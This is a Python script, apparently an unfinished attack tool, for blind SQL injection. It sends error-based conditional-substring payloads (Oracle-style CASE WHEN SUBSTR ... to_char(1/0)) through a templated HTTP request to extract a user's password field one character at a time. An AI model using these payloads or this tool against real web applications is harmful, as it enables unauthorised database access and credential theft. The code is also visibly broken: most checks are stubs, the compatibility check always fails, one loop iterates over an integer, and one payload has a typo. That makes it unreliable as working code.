import email
from io import BytesIO
from http.server import BaseHTTPRequestHandler
import argparse
import io
from pprint import pprint
import sys
from urllib import response
import requests

from distutils.log import error
from ast import arg
from string import Template

parser = argparse.ArgumentParser("password_enum")

parser.add_argument(
    "--type", help="The method of injection to use.", choices=['error', 'dom', 'delay'], default='error')
parser.add_argument(
    "--success", help="A string to search for in the response that denotes successful execution.", type=str, default="Internal Server Error")
parser.add_argument(
    "--template", help="The request template used to contain the injection code.", type=str, default='template.txt')
parser.add_argument(
    "--wordlist", help="The wordlist used for payloads", type=str, default="wordlists/atob0to9.txt")
parser.add_argument(
    "--ssl", help="The wordlist used for payloads", action=argparse.BooleanOptionalAction)
# parser.add_argument(
#     "--url", help="The target URL.", type=str)

parser.add_argument(
    "table", help="The table containing the information to enumerate.", type=str)
parser.add_argument(
    "columnName", help="The column name used to match a record to enumerate.", type=str)
parser.add_argument(
    "columnValue", help="The column value used to match a record to enumerate.", type=str)
parser.add_argument(
    "fieldName", help="The field to enumerate.", type=str)

# Settings
MARKER = '[[INJECTION_POINT]]'
FIELD_LENGTH_LIMIT = 50

# SQL Commands
SQL = {
    'BASIC_CMD': "||(SELECT '')||",
    'CONDITIONAL_SUBSTRING_ENUM': "||(SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE username='$identifier')||"
}
ORACLE = {
    'BASIC_CMD': "||(SELECT '' from dual}||",
    'CONDITIONAL_SUBSTRING_ENUM': "||(SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE username='$identifier')||"
}

args = parser.parse_args()

tableName = args.table
columnName = args.columnName
columnValue = args.columnValue
target = args.fieldName

try:
    wlFile = open(args.wordlist, "r")
except FileNotFoundError:
    error("Wordlist does not exists!")
else:
    values = wlFile.read()
    payloadValues = values.split(',')
    wlFile.close()

try:
    templateFile = open(args.template, "r")
except FileNotFoundError:
    error("Template does not exists!")
else:
    template = templateFile.read()
    templateFile.close()

request_line, headers_alone = template.split('\n', 1)

message = email.message_from_file(io.StringIO(headers_alone))
headers = dict(message.items())
protocol = "https://" if args.ssl else "http://"
url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"


def isSqlCompatible():
    result = executeRequest()
    print("Checking SQL is being used")


def checkTableExists(tableName):
    print("Checking table exists")


def checkRowExists(tableName, columnName, columnValue):
    print("Checking table exists")


def enumerateFieldLength(tableName, columnExists):
    print("Getting field length...")
    for x in FIELD_LENGTH_LIMIT:
        print("Checking length ", x)


def generateSqlStatement(sql):
    print("Generating SQL statement")


def inject(sql):
    print("Injecting SQL into template")
    for header, value in headers.items():
        if MARKER in value:
            headers[header] = value.replace(MARKER, f"' {sql}'")

    pprint(headers)


def executeRequest():
    print("Sending payload")
    cookies = dict()
    orgCookies = headers['Cookie'].split(';')
    for cookie in orgCookies:
        fK = cookie.split("=")
        cookies.update({fK[0]: fK[1]})
    response = requests.get(url, cookies=cookies)
    print(headers['Cookie'])
    containsMarker = args.success in response.text
    print(f'Request body returned - {response.headers}\n\n{response.text}')


if not isSqlCompatible():
    print(f"Target {target} appears to not be process commands as SQL")
    sys.exit()

if not checkTableExists(tableName):
    print(f"Table {tableName} does not exist!")
    sys.exit()

if not checkRowExists(tableName, columnName, columnValue):
    print(
        f"Then entry with identifer {columnName} does not exist with a vaule of ${columnValue}!")
    sys.exit()
